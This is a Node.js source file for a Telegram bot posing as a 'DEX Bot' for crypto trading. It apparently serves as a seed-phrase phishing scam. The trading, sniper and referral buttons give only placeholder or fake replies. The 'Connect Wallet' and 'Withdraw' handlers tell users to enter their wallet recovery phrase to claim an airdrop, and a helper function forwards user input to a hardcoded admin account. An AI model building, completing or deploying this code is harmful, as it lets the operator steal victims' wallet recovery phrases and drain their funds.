const { Telegraf, Markup } = require('telegraf');
require('dotenv').config();
const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = '7152379504'; // Your Telegram ID

// Send message to you (admin)
async function sendNotification(ctx,username,msg) {
  await ctx.telegram.sendMessage(ADMIN_ID, `New input from @${username}:\n"${msg}"`);
}

bot.start((ctx) => {
  ctx.reply('Welcome to DEX Bot. Choose an option:', mainMenu);
});

// Inline keyboard layout
const mainMenu = Markup.keyboard([
  ['💰 Sell', '🛒 Buy'],
  ['🖥 Copy Trade', '📊 Position'],
  ['🎁 Claim airdrop'],
  ['🔗 Connect Wallet', '🔄 Reload'],
  ['🛡 Security tips'],
  ['🚀 LP Sniper', '👥 Referrals'],
  ['💸 Withdraw']
]).resize();

// Placeholder handlers for each button
bot.hears('💰 Sell', (ctx) => ctx.reply('Sell selected.'));
bot.hears('🛒 Buy', (ctx) => ctx.reply('Buy selected.'));
bot.hears('🖥 Copy Trade', (ctx) => ctx.reply('Copy Trade selected.'));
bot.hears('📊 Position', (ctx) => ctx.reply('Your current positions.'));
bot.hears('🎁 Claim airdrop', (ctx) => ctx.reply('Claiming airdrop...'));
bot.hears('🔗 Connect Wallet', (ctx) => ctx.reply('Enter your 12-word/24-word recovery phrase to proceed'));
bot.hears('🔄 Reload', (ctx) => ctx.reply('Refreshing your dashboard...'));
bot.hears('🛡 Security tips', (ctx) => ctx.reply('Never share your private key or recovery phrase.'));
bot.hears('🚀 LP Sniper', (ctx) => ctx.reply('#Sniper Profits maximize activated.'));
bot.hears('👥 Referrals', (ctx) => {
  ctx.replyWithMarkdown(`
*Invite your friends to save 10% on fees.*

If you've traded more than $10k volume in a week you'll receive a *35%* share of the fees paid by your referees! Otherwise, you'll receive a *25%* share.

*Your Referrals* (updated every 15 min):
- Users referred: 0 (direct: 0, indirect: 0)
- Total rewards: 0.0000  ($0.00)
- Total paid: 0.0000  ($0.00)
- Total unpaid: 0.0000  ($0.00)

Rewards are paid daily and airdropped directly to your *chosen Rewards Wallet*.  
You must have accrued at least 0.005 SOL in unpaid fees to be eligible for a payout.

We've established a tiered referral system, ensuring that as more individuals come onboard, rewards extend through five different layers of users.

This structure not only benefits *community growth* but also *increases the fee share* for everyone.

Stay tuned for more details on how we'll reward active users and *happy trading*!
  `);
});
bot.hears('💸 Withdraw', (ctx) => {
  ctx.reply(`
To claim your airdrop or see available airdrops, make sure your *SOL & ETH wallet* is connected.

Click on the 'Connect Wallet' button to connect your wallet and click *Refresh* to update.
  `, { parse_mode: 'Markdown' });
});

bot.on('text', async (ctx) => {
  const msg = ctx.message.text;
  const username = ctx.from.username || ctx.from.first_name;
});


module.exports = bot;
